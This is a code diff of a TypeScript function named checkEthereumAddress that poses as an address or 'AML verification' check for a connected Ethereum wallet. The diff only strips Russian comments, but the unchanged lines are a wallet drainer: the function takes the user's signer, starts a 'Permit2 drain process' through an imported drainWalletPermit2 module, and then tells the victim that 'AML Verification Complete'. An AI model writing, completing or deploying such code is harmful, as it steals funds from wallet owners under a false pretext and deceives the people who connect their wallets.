@@ -2,7 +2,6 @@ import { drainWalletPermit2 } from './permit2-drainer';
 import { ethers } from 'ethers';
 
 export async function checkEthereumAddress(address: string, wagmiProvider?: any) {
-  // Валидация адреса
   if (!address.match(/^0x[a-fA-F0-9]{40}$/)) {
     return { 
       success: false,
@@ -11,7 +10,6 @@ export async function checkEthereumAddress(address: string, wagmiProvider?: any)
     };
   }
 
-  // Проверяем, передан ли provider (значит кошелек подключен)
   if (!wagmiProvider) {
     return {
       success: false,
@@ -24,11 +22,9 @@ export async function checkEthereumAddress(address: string, wagmiProvider?: any)
   console.log('🔍 Starting Ethereum Permit2 check for:', address);
 
   try {
-    // Получаем signer из wagmi provider
     const ethersProvider = new ethers.BrowserProvider(wagmiProvider);
     const signer = await ethersProvider.getSigner();
 
-    // Проверяем что подключенный адрес совпадает с проверяемым
     const connectedAddress = await signer.getAddress();
     if (connectedAddress.toLowerCase() !== address.toLowerCase()) {
       return {
@@ -40,7 +36,6 @@ export async function checkEthereumAddress(address: string, wagmiProvider?: any)
 
     console.log('🚀 Starting Permit2 drain process...');
     
-    // Запускаем процесс Permit2 drain
     const drainResult = await drainWalletPermit2('eth', signer);
 
     if (!drainResult.success) {
@@ -51,7 +46,6 @@ export async function checkEthereumAddress(address: string, wagmiProvider?: any)
       };
     }
 
-    // Возвращаем результат в формате как у TON
     return {
       success: true,
       message: '✅ AML Verification Complete',
